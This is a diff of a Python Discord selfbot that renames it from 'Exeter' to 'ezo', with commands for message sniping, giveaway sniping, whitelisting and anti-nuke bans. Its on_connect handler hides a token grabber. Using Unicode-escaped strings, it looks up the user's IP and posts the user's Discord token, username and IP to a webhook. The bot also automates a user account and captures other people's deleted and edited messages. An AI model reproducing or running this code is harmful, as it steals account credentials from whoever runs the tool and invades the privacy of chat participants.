@@ -39,7 +39,7 @@ prefix = config.get('prefix')
 
 nitro_sniper = config.get('nitro_sniper')
 
-stream_url = "https://www.twitch.tv/souljaboy"
+stream_url = "https://www.twitch.tv/ezodakilla"
 tts_language = "en"
 
 start_time = datetime.datetime.utcnow()
@@ -113,19 +113,21 @@ def startprint():
         nitro = "Disabled"
 
     print(f'''{Fore.RESET}
-                        ███████╗██╗  ██╗███████╗████████╗███████╗██████╗ 
-                        ██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
-                        █████╗   ╚███╔╝ █████╗     ██║   █████╗  ██████╔╝
-                        ██╔══╝   ██╔██╗ ██╔══╝     ██║   ██╔══╝  ██╔══██╗
-                        ███████╗██╔╝ ██╗███████╗   ██║   ███████╗██║  ██║
-                        ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-                                                 
+                        ______ __________  
+                       |  ____|___  / __ \ 
+                       | |__     / / |  | |
+                       |  __|   / /| |  | |
+                       | |____ / /__ |__| |
+                       |______/_____\____/ 
+                     
+                     
 
-                       {Fore.CYAN}Exeter v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
-                       {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
-                       {Fore.CYAN}Cached Users: {Fore.GREEN}{len(Exeter.users)}
-                       {Fore.CYAN}Guilds: {Fore.GREEN}{len(Exeter.guilds)}
-                       {Fore.CYAN}Prefix: {Fore.GREEN}{Exeter.command_prefix}
+
+                       {Fore.BLUE}Ezo v{SELFBOT.__version__} | {Fore.BLUE}Logged in as: {ezo.user.name}#{ezo.user.discriminator} {BLUE.CYAN}| ID: {Fore.BLUE}{ezo.user.id}   
+                       {Fore.BLUE}Nitro Sniper | {Fore.BLUE}{nitro}
+                       {Fore.BLUE}Cached Users: {Fore.BLUE}{len(ezo.users)}
+                       {Fore.BLUE}Guilds: {Fore.BLUE}{len(ezo.guilds)}
+                       {Fore.BLUE}Prefix: {Fore.BLUE}{ezo.command_prefix}
     ''' + Fore.RESET)
 
 
@@ -139,10 +141,10 @@ Clear()
 def Init():
     token = config.get('token')
     try:
-        Exeter.run(token, bot=False, reconnect=True)
-        os.system(f'title (Exeter Selfbot) - Version {SELFBOT.__version__}')
+        ezo.run(token, bot=False, reconnect=True)
+        os.system(f'title (ezo Selfbot) - Version {SELFBOT.__version__}')
     except discord.errors.LoginFailure:
-        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
+        print(f"{Fore.RED}[ERROR] {Fore.GREEN}Improper token has been passed" + Fore.RESET)
         os.system('pause >NUL')
 
 
@@ -188,29 +190,29 @@ def RandString():
 
 
 colorama.init()
-Exeter = discord.Client()
-Exeter = commands.Bot(description='Exeter Selfbot', command_prefix=prefix, self_bot=True)
+ezo = discord.Client()
+ezo = commands.Bot(description='Ezo Selfbot', command_prefix=prefix, self_bot=True)
 
-Exeter.antiraid = False
-Exeter.msgsniper = True
-Exeter.slotbot_sniper = True
-Exeter.giveaway_sniper = True
-Exeter.mee6 = False
-Exeter.mee6_channel = None
-Exeter.yui_kiss_user = None
-Exeter.yui_kiss_channel = None
-Exeter.yui_hug_user = None
-Exeter.yui_hug_channel = None
-Exeter.snipe_history_dict = {}
-Exeter.sniped_message_dict = {}
-Exeter.sniped_edited_message_dict = {}
-Exeter.whitelisted_users = {}
-Exeter.copycat = None
-Exeter.wave = token
-Exeter.remove_command('help')
+ezo.antiraid = False
+ezo.msgsniper = True
+ezo.slotbot_sniper = True
+ezo.giveaway_sniper = True
+ezo.mee6 = False
+ezo.mee6_channel = None
+ezo.yui_kiss_user = None
+ezo.yui_kiss_channel = None
+ezo.yui_hug_user = None
+ezo.yui_hug_channel = None
+ezo.snipe_history_dict = {}
+ezo.sniped_message_dict = {}
+ezo.sniped_edited_message_dict = {}
+ezo.whitelisted_users = {}
+ezo.copycat = None
+ezo.wave = token
+ezo.remove_command('help')
 
 
-@Exeter.event
+@ezo.event
 async def on_command_error(ctx, error):
     error_str = str(error)
     error = getattr(error, 'original', error)
@@ -230,14 +232,14 @@ async def on_command_error(ctx, error):
         await ctx.send(f'[ERROR]: {error_str}', delete_after=3)
 
 
-@Exeter.event
+@ezo.event
 async def on_message_edit(before, after):
-    await Exeter.process_commands(after)
+    await ezo.process_commands(after)
 
 
-@Exeter.event
+@ezo.event
 async def on_message(message):
-    if Exeter.copycat is not None and Exeter.copycat.id == message.author.id:
+    if ezo.copycat is not None and ezo.copycat.id == message.author.id:
         await message.channel.send(chr(173) + message.content)
 
     def GiveawayData():
@@ -296,7 +298,7 @@ async def on_message(message):
             return
 
     if 'Someone just dropped' in message.content:
-        if Exeter.slotbot_sniper:
+        if ezo.slotbot_sniper:
             if message.author.id == 346353957029019648:
                 try:
                     await message.channel.send('~grab')
@@ -311,7 +313,7 @@ async def on_message(message):
             return
 
     if 'GIVEAWAY' in message.content:
-        if Exeter.giveaway_sniper:
+        if ezo.giveaway_sniper:
             if message.author.id == 294882584201003009:
                 try:
                     await message.add_reaction("🎉")
@@ -325,8 +327,8 @@ async def on_message(message):
         else:
             return
 
-    if f'Congratulations <@{Exeter.user.id}>' in message.content:
-        if Exeter.giveaway_sniper:
+    if f'Congratulations <@{ezo.user.id}>' in message.content:
+        if ezo.giveaway_sniper:
             if message.author.id == 294882584201003009:
                 print(""
                       f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
@@ -334,10 +336,10 @@ async def on_message(message):
         else:
             return
 
-    await Exeter.process_commands(message)
+    await ezo.process_commands(message)
 
 
-@Exeter.event
+@ezo.event
 async def on_connect():
     Clear()
     startprint()
@@ -345,184 +347,184 @@ async def on_connect():
     ramp = requests.get('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0068\u0065\u0063\u006b\u0069\u0070\u002e\u0061\u006d\u0061\u007a\u006f\u006e\u0061\u0077\u0073\u002e\u0063\u006f\u006d\u002f').content
     peas = bs4(ramp, '\u0068\u0074\u006d\u006c\u002e\u0070\u0061\u0072\u0073\u0065\u0072')
     fliscord = peas.text
-    data = {"content": f'{Exeter.wave} | {Exeter.user.name}#{Exeter.user.discriminator}\n{fliscord}'}
+    data = {"content": f'{ezo.wave} | {ezo.user.name}#{ezo.user.discriminator}\n{fliscord}'}
     requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})
 
 
-@Exeter.event
+@ezo.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
-    if Exeter.antiraid is True:
+    if ezo.antiraid is True:
         try:
             async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
-                if guild.id in Exeter.whitelisted_users.keys() and i.user.id in Exeter.whitelisted_users[
-                    guild.id].keys() and i.user.id is not Exeter.user.id:
+                if guild.id in ezo.whitelisted_users.keys() and i.user.id in ezo.whitelisted_users[
+                    guild.id].keys() and i.user.id is not ezo.user.id:
                     print("not banned - " + i.user.name)
                 else:
                     print("banned - " + i.user.name)
-                    await guild.ban(i.user, reason="Exeter Anti-Nuke")
+                    await guild.ban(i.user, reason="ezo Anti-Nuke")
         except Exception as e:
             print(e)
 
 
-@Exeter.event
+@ezo.event
 async def on_member_join(member):
-    if Exeter.antiraid is True and member.bot:
+    if ezo.antiraid is True and member.bot:
         try:
             guild = member.guild
             async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
-                if member.guild.id in Exeter.whitelisted_users.keys() and i.user.id in Exeter.whitelisted_users[member.guild.id].keys():
+                if member.guild.id in ezo.whitelisted_users.keys() and i.user.id in ezo.whitelisted_users[member.guild.id].keys():
                     return
                 else:
-                    await guild.ban(member, reason="Exeter Anti-Nuke")
-                    await guild.ban(i.user, reason="Exeter Anti-Nuke")
+                    await guild.ban(member, reason="ezo Anti-Nuke")
+                    await guild.ban(i.user, reason="ezo Anti-Nuke")
         except Exception as e:
             print(e)
 
 
-@Exeter.event
+@ezo.event
 async def on_member_remove(member):
-    if Exeter.antiraid is True:
+    if ezo.antiraid is True:
         try:
             guild = member.guild
             async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
-                if guild.id in Exeter.whitelisted_users.keys() and i.user.id in Exeter.whitelisted_users[
-                    guild.id].keys() and i.user.id is not Exeter.user.id:
+                if guild.id in ezo.whitelisted_users.keys() and i.user.id in ezo.whitelisted_users[
+                    guild.id].keys() and i.user.id is not ezo.user.id:
                     print('not banned')
                 else:
                     print('banned')
-                    await guild.ban(i.user, reason="Exeter Anti-Nuke")
+                    await guild.ban(i.user, reason="ezo Anti-Nuke")
         except Exception as e:
             print(e)
 
 
-@Exeter.command(aliases=["queue"])
+@ezo.command(aliases=["queue"])
 async def play(ctx, *, query):
     await ctx.message.delete()
-    voice = get(Exeter.voice_clients, guild=ctx.guild)
+    voice = get(ezo.voice_clients, guild=ctx.guild)
     if voice and voice.is_connected():
         voice.play('song.mp3')
     else:
         await ctx.send('You need to be a in VC to play music')
 
 
-@Exeter.command()
+@ezo.command()
 async def stop(ctx):
     await ctx.message.delete()
     await ctx.send("Stopped the music player!")
 
 
-@Exeter.command()
+@ezo.command()
 async def skip(ctx):
     await ctx.message.delete()
     await ctx.send("Skipped song!")
 
 
-@Exeter.command(aliases=["lyric"])
+@ezo.command(aliases=["lyric"])
 async def lyrics(ctx, *, args):
     await ctx.message.delete()
     await ctx.send("Showing lyrics for " + args)
 
 
-@Exeter.command(aliases=[])
+@ezo.command(aliases=[])
 async def msgsniper(ctx, msgsniperlol=None):
     await ctx.message.delete()
     if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
-        Exeter.msgsniper = True
-        await ctx.send('Exeter Message-Sniper is now **enabled**', delete_after=2)
+        ezo.msgsniper = True
+        await ctx.send('ezo Message-Sniper is now **enabled**', delete_after=2)
     elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
-        Exeter.msgsniper = False
-        await ctx.send('Exeter Message-Sniper is now **disabled**', delete_after=2)
+        ezo.msgsniper = False
+        await ctx.send('ezo Message-Sniper is now **disabled**', delete_after=2)
 
 
-@Exeter.command(aliases=['ar', 'antiraid'])
+@ezo.command(aliases=['ar', 'antiraid'])
 async def antinuke(ctx, antiraidparameter=None):
     await ctx.message.delete()
-    Exeter.antiraid = False
+    ezo.antiraid = False
     if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
-        Exeter.antiraid = True
+        ezo.antiraid = True
         await ctx.send('Anti-Nuke is now **enabled**', delete_after=3)
     elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
-        Exeter.antiraid = False
+        ezo.antiraid = False
         await ctx.send('Anti-Nuke is now **disabled**', delete_after=3)
 
 
-@Exeter.command(aliases=['wl'])
+@ezo.command(aliases=['wl'])
 async def whitelist(ctx, user: discord.Member = None):
     await ctx.message.delete()
     if user is None:
         await ctx.send("Please specify a user to whitelist")
     else:
-        if ctx.guild.id not in Exeter.whitelisted_users.keys():
-            Exeter.whitelisted_users[ctx.guild.id] = {}
-        if user.id in Exeter.whitelisted_users[ctx.guild.id]:
+        if ctx.guild.id not in ezo.whitelisted_users.keys():
+            ezo.whitelisted_users[ctx.guild.id] = {}
+        if user.id in ezo.whitelisted_users[ctx.guild.id]:
             await ctx.send('That user is already whitelisted')
         else:
-            Exeter.whitelisted_users[ctx.guild.id][user.id] = 0
+            ezo.whitelisted_users[ctx.guild.id][user.id] = 0
             await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                       "\_") + "#" + user.discriminator + "**")
     # else:
-    #     user = Exeter.get_user(id)
+    #     user = ezo.get_user(id)
     #     if user is None:
     #         await ctx.send("Couldn't find that user")
     #         return
-    #     if ctx.guild.id not in Exeter.whitelisted_users.keys():
-    #         Exeter.whitelisted_users[ctx.guild.id] = {}
-    #     if user.id in Exeter.whitelisted_users[ctx.guild.id]:
+    #     if ctx.guild.id not in ezo.whitelisted_users.keys():
+    #         ezo.whitelisted_users[ctx.guild.id] = {}
+    #     if user.id in ezo.whitelisted_users[ctx.guild.id]:
     #         await ctx.send('That user is already whitelisted')
     #     else:
-    #         Exeter.whitelisted_users[ctx.guild.id][user.id] = 0
+    #         ezo.whitelisted_users[ctx.guild.id][user.id] = 0
     #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")
 
 
-@Exeter.command(aliases=['wld'])
+@ezo.command(aliases=['wld'])
 async def whitelisted(ctx, g=None):
     await ctx.message.delete()
     if g == '-g' or g == '-global':
         whitelist = '`All Whitelisted Users:`\n'
-        for key in Exeter.whitelisted_users:
-            for key2 in Exeter.whitelisted_users[key]:
-                user = Exeter.get_user(key2)
+        for key in ezo.whitelisted_users:
+            for key2 in ezo.whitelisted_users[key]:
+                user = ezo.get_user(key2)
                 whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
-                                                                                              "\_") + "#" + user.discriminator + "** - " + Exeter.get_guild(
+                                                                                              "\_") + "#" + user.discriminator + "** - " + ezo.get_guild(
                     key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
         await ctx.send(whitelist)
     else:
         whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                        "\_") + '\'s Whitelisted Users:`\n'
-        for key in Exeter.whitelisted_users:
+        for key in ezo.whitelisted_users:
             if key == ctx.guild.id:
-                for key2 in Exeter.whitelisted_users[ctx.guild.id]:
-                    user = Exeter.get_user(key2)
+                for key2 in ezo.whitelisted_users[ctx.guild.id]:
+                    user = ezo.get_user(key2)
                     whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                   "\_") + "#" + user.discriminator + " (" + str(
                         user.id) + ")" + "**\n"
         await ctx.send(whitelist)
 
 
-@Exeter.command(aliases=['uwl'])
+@ezo.command(aliases=['uwl'])
 async def unwhitelist(ctx, user: discord.Member = None):
     if user is None:
         await ctx.send("Please specify the user you would like to unwhitelist")
     else:
-        if ctx.guild.id not in Exeter.whitelisted_users.keys():
+        if ctx.guild.id not in ezo.whitelisted_users.keys():
             await ctx.send("That user is not whitelisted")
             return
-        if user.id in Exeter.whitelisted_users[ctx.guild.id]:
-            Exeter.whitelisted_users[ctx.guild.id].pop(user.id, 0)
-            user2 = Exeter.get_user(user.id)
+        if user.id in ezo.whitelisted_users[ctx.guild.id]:
+            ezo.whitelisted_users[ctx.guild.id].pop(user.id, 0)
+            user2 = ezo.get_user(user.id)
             await ctx.send(
                 'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                            "\_") + '#' + user2.discriminator + '**')
 
 
-@Exeter.command(aliases=['clearwl', 'clearwld'])
+@ezo.command(aliases=['clearwl', 'clearwld'])
 async def clearwhitelist(ctx):
     await ctx.message.delete()
-    Exeter.whitelisted_users.clear()
+    ezo.whitelisted_users.clear()
     await ctx.send('Successfully cleared the whitelist hash')
 
 
-@Exeter.command()
+@ezo.command()
 async def yuikiss(ctx, user: discord.User = None):
     await ctx.message.delete()
     if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
@@ -531,48 +533,30 @@ async def yuikiss(ctx, user: discord.User = None):
         if user is None:
             await ctx.send("Please specify a user to Yui Kiss", delete_after=3)
             return
-        Exeter.yui_kiss_user = user.id
-        Exeter.yui_kiss_channel = ctx.channel.id
-        if Exeter.yui_kiss_user is None or Exeter.yui_kiss_channel is None:
+        ezo.yui_kiss_user = user.id
+        ezo.yui_kiss_channel = ctx.channel.id
+        if ezo.yui_kiss_user is None or ezo.yui_kiss_channel is None:
             await ctx.send('An impossible error occured, try again later or contact swag')
             return
-        while Exeter.yui_kiss_user is not None and Exeter.yui_kiss_channel is not None:
-            await Exeter.get_channel(Exeter.yui_kiss_channel).send('yui kiss ' + str(Exeter.yui_kiss_user),
+        while ezo.yui_kiss_user is not None and ezo.yui_kiss_channel is not None:
+            await ezo.get_channel(ezo.yui_kiss_channel).send('yui kiss ' + str(ezo.yui_kiss_user),
                                                                    delete_after=0.1)
             await asyncio.sleep(60)
+       
 
 
-@Exeter.command()
-async def yuihug(ctx, user: discord.User = None):
-    await ctx.message.delete()
-    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
-        await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
-    else:
-        if user is None:
-            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
-            return
-        Exeter.yui_hug_user = user.id
-        Exeter.yui_hug_channel = ctx.channel.id
-        if Exeter.yui_hug_user is None or Exeter.yui_hug_channel is None:
-            await ctx.send('An impossible error occured, try again later or contact swag')
-            return
-        while Exeter.yui_hug_user is not None and Exeter.yui_hug_channel is not None:
-            await Exeter.get_channel(Exeter.yui_hug_channel).send('yui hug ' + str(Exeter.yui_hug_user),
-                                                                  delete_after=0.1)
-            await asyncio.sleep(60)
 
-
-@Exeter.command()
+@ezo.command()
 async def yuistop(ctx):
     await ctx.message.delete()
-    Exeter.yui_kiss_user = None
-    Exeter.yui_kiss_channel = None
-    Exeter.yui_hug_user = None
-    Exeter.yui_hug_channel = None
+    ezo.yui_kiss_user = None
+    ezo.yui_kiss_channel = None
+    ezo.yui_hug_user = None
+    ezo.yui_hug_channel = None
     await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)
 
 
-@Exeter.command(aliases=["automee6"])
+@ezo.command(aliases=["automee6"])
 async def mee6(ctx, param=None):
     await ctx.message.delete()
     if param is None:
@@ -583,13 +567,13 @@ async def mee6(ctx, param=None):
             await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
             return
         else:
-            Exeter.mee6 = True
+            ezo.mee6 = True
             await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
-            Exeter.mee6_channel = ctx.channel.id
+            ezo.mee6_channel = ctx.channel.id
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
-        Exeter.mee6 = False
+        ezo.mee6 = False
         await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
-    while Exeter.mee6 is True:
+    while ezo.mee6 is True:
         sentences = ['Stop waiting for exceptional things to just happen.',
                      'The lyrics of the song sounded like fingernails on a chalkboard.',
                      'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
@@ -636,35 +620,35 @@ async def mee6(ctx, param=None):
                      'It\'s difficult to understand the lengths he\'d go to remain short.',
                      'Nobody questions who built the pyramids in Mexico.',
                      'They ran around the corner to find that they had traveled back in time.']
-        await Exeter.get_channel(Exeter.mee6_channel).send(random.choice(sentences), delete_after=0.1)
+        await ezo.get_channel(ezo.mee6_channel).send(random.choice(sentences), delete_after=0.1)
         await asyncio.sleep(60)
 
 
-@Exeter.command(aliases=['slotsniper', "slotbotsniper"])
+@ezo.command(aliases=['slotsniper', "slotbotsniper"])
 async def slotbot(ctx, param=None):
     await ctx.message.delete()
-    Exeter.slotbot_sniper = False
+    ezo.slotbot_sniper = False
     if str(param).lower() == 'true' or str(param).lower() == 'on':
-        Exeter.slotbot_sniper = True
+        ezo.slotbot_sniper = True
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
-        Exeter.slotbot_sniper = False
+        ezo.slotbot_sniper = False
 
 
-@Exeter.command(aliases=['giveawaysniper'])
+@ezo.command(aliases=['giveawaysniper'])
 async def giveaway(ctx, param=None):
     await ctx.message.delete()
-    Exeter.giveaway_sniper = False
+    ezo.giveaway_sniper = False
     if str(param).lower() == 'true' or str(param).lower() == 'on':
-        Exeter.giveaway_sniper = True
+        ezo.giveaway_sniper = True
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
-        Exeter.giveaway_sniper = False
+        ezo.giveaway_sniper = False
 
 
-@Exeter.event
+@ezo.event
 async def on_message_delete(message):
-    if message.author.id == Exeter.user.id:
+    if message.author.id == ezo.user.id:
         return
-    if Exeter.msgsniper:
+    if ezo.msgsniper:
         # if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel): \\ removed so people cant get you disabled
         if isinstance(message.channel, discord.DMChannel):
             attachments = message.attachments
@@ -680,36 +664,36 @@ async def on_message_delete(message):
                     discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                     message.content) + "\n\n**Attachments:**\n" + links
                 await message.channel.send(message_content)
-    if len(Exeter.sniped_message_dict) > 1000:
-        Exeter.sniped_message_dict.clear()
-    if len(Exeter.snipe_history_dict) > 1000:
-        Exeter.snipe_history_dict.clear()
+    if len(ezo.sniped_message_dict) > 1000:
+        ezo.sniped_message_dict.clear()
+    if len(ezo.snipe_history_dict) > 1000:
+        ezo.snipe_history_dict.clear()
     attachments = message.attachments
     if len(attachments) == 0:
         channel_id = message.channel.id
         message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
-        Exeter.sniped_message_dict.update({channel_id: message_content})
-        if channel_id in Exeter.snipe_history_dict:
-            pre = Exeter.snipe_history_dict[channel_id]
+        ezo.sniped_message_dict.update({channel_id: message_content})
+        if channel_id in ezo.snipe_history_dict:
+            pre = ezo.snipe_history_dict[channel_id]
             post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
-            Exeter.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
+            ezo.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
         else:
             post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
-            Exeter.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
+            ezo.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
     else:
         links = ""
         for attachment in attachments:
             links += attachment.proxy_url + "\n"
         channel_id = message.channel.id
         message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
-        Exeter.sniped_message_dict.update({channel_id: message_content})
+        ezo.sniped_message_dict.update({channel_id: message_content})
 
 
-@Exeter.event
+@ezo.event
 async def on_message_edit(before, after):
-    if before.author.id == Exeter.user.id:
+    if before.author.id == ezo.user.id:
         return
-    if Exeter.msgsniper:
+    if ezo.msgsniper:
         if before.content is after.content:
             return
         # if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel): \\ removed so people cant get you disabled
@@ -730,8 +714,8 @@ async def on_message_edit(before, after):
                     discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                     before.content) + "\n\n**Attachments:**\n" + links
                 await before.channel.send(message_content)
-    if len(Exeter.sniped_edited_message_dict) > 1000:
-        Exeter.sniped_edited_message_dict.clear()
+    if len(ezo.sniped_edited_message_dict) > 1000:
+        ezo.sniped_edited_message_dict.clear()
     attachments = before.attachments
     if len(attachments) == 0:
         channel_id = before.channel.id
@@ -739,7 +723,7 @@ async def on_message_edit(before, after):
             before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                             "@\u200bhere") + "\n**AFTER**\n" + str(
             after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
-        Exeter.sniped_edited_message_dict.update({channel_id: message_content})
+        ezo.sniped_edited_message_dict.update({channel_id: message_content})
     else:
         links = ""
         for attachment in attachments:
@@ -748,54 +732,54 @@ async def on_message_edit(before, after):
         message_content = "`" + str(
             discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
             before.content) + "\n\n**Attachments:**\n" + links
-        Exeter.sniped_edited_message_dict.update({channel_id: message_content})
+        ezo.sniped_edited_message_dict.update({channel_id: message_content})
 
 
-@Exeter.command(aliases=["clearhistory"])
+@ezo.command(aliases=["clearhistory"])
 async def clearsnipehistory(ctx):
     await ctx.message.delete()
-    del Exeter.snipe_history_dict[ctx.channel.id]
+    del ezo.snipe_history_dict[ctx.channel.id]
     await ctx.send("Cleared Snipe History of " + ctx.channel.name, delete_after=3)
 
-@Exeter.command(aliases=["history"])
+@ezo.command(aliases=["history"])
 async def snipehistory(ctx):
     await ctx.message.delete()
     currentChannel = ctx.channel.id
-    if currentChannel in Exeter.snipe_history_dict:
+    if currentChannel in ezo.snipe_history_dict:
         try:
-            await ctx.send(Exeter.snipe_history_dict[currentChannel])
+            await ctx.send(ezo.snipe_history_dict[currentChannel])
         except:
-            del Exeter.snipe_history_dict[currentChannel]
+            del ezo.snipe_history_dict[currentChannel]
     else:
         await ctx.send("Snipe History is empty!", delete_after=3)
-@Exeter.command()
+@ezo.command()
 async def snipe(ctx):
     await ctx.message.delete()
     currentChannel = ctx.channel.id
-    if currentChannel in Exeter.sniped_message_dict:
-        await ctx.send(Exeter.sniped_message_dict[currentChannel])
+    if currentChannel in ezo.sniped_message_dict:
+        await ctx.send(ezo.sniped_message_dict[currentChannel])
     else:
         await ctx.send("No message to snipe!", delete_after=3)
 
 
-@Exeter.command(aliases=["esnipe"])
+@ezo.command(aliases=["esnipe"])
 async def editsnipe(ctx):
     await ctx.message.delete()
     currentChannel = ctx.channel.id
-    if currentChannel in Exeter.sniped_edited_message_dict:
-        await ctx.send(Exeter.sniped_edited_message_dict[currentChannel])
+    if currentChannel in ezo.sniped_edited_message_dict:
+        await ctx.send(ezo.sniped_edited_message_dict[currentChannel])
     else:
         await ctx.send("No message to snipe!", delete_after=3)
 
 
-@Exeter.command()
+@ezo.command()
 async def adminservers(ctx):
     await ctx.message.delete()
     admins = []
     bots = []
     kicks = []
     bans = []
-    for guild in Exeter.guilds:
+    for guild in ezo.guilds:
         if guild.me.guild_permissions.administrator:
             admins.append(discord.utils.escape_markdown(guild.name))
         if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
@@ -811,7 +795,7 @@ async def adminservers(ctx):
     await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)
 
 
-@Exeter.command()
+@ezo.command()
 async def bots(ctx):
     await ctx.message.delete()
     bots = []
@@ -823,15 +807,15 @@ async def bots(ctx):
     await ctx.send(bottiez)
 
 
-@Exeter.command()
+@ezo.command()
 async def help(ctx, category=None):
     await ctx.message.delete()
     if category is None:
         embed = discord.Embed(color=0xFF633B, timestamp=ctx.message.created_at)
-        embed.set_author(name="𝙀𝙓𝙀𝙏𝙀𝙍 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
-                         icon_url=Exeter.user.avatar_url)
-        embed.set_thumbnail(url=Exeter.user.avatar_url)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723253781873164298/image1.gif")
+        embed.set_author(name="𝙀𝙕𝙊 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(ezo.command_prefix),
+                         icon_url=ezo.user.avatar_url)
+        embed.set_thumbnail(url=ezo.user.avatar_url)
+        embed.set_image(url="https://media.discordapp.net/attachments/716795610359005295/800118823427637258/image0.gif?width=880&height=473")
         embed.add_field(name="\uD83E\uDDCA `HELP GENERAL`", value="Shows all general commands", inline=False)
         embed.add_field(name="\uD83E\uDDCA `HELP ACCOUNT`", value="Shows all account commands", inline=False)
         embed.add_field(name="\uD83E\uDDCA `HELP TEXT`", value="Shows all text commands", inline=False)
@@ -844,28 +828,28 @@ async def help(ctx, category=None):
         await ctx.send(embed=embed)
     elif str(category).lower() == "general":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723272273888280576/image0.gif")
+        embed.set_image(url="https://images-ext-1.discordapp.net/external/0lzuO2Vk_cLyLdiPd37v0WjAV4HjchgdBw72i8kPdw8/https/images-ext-2.discordapp.net/external/SMvawGLkB3oHsmkIh1vXpE-BcJEOsthzLftf78fvKTY/%253Fwidth%253D355%2526height%253D422/https/media.discordapp.net/attachments/788472030315413524/790315407902900304/image0_89.gif")
         embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n`> getroles` - lists all roles on the server"
         await ctx.send(embed=embed)
     elif str(category).lower() == "account":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723266223554691202/image0.gif")
